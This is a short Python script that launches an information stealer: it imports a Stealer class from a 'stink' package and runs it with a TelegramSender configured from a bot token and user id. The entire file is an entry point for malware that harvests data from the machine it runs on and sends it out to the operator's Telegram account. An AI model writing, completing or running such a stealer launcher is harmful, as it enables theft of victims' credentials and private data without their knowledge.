from stink import Stealer
from stink.modules import TelegramSender
from env import *

if __name__ == "__main__":
    Stealer(sender=TelegramSender(token=token, user_id=id)).run()
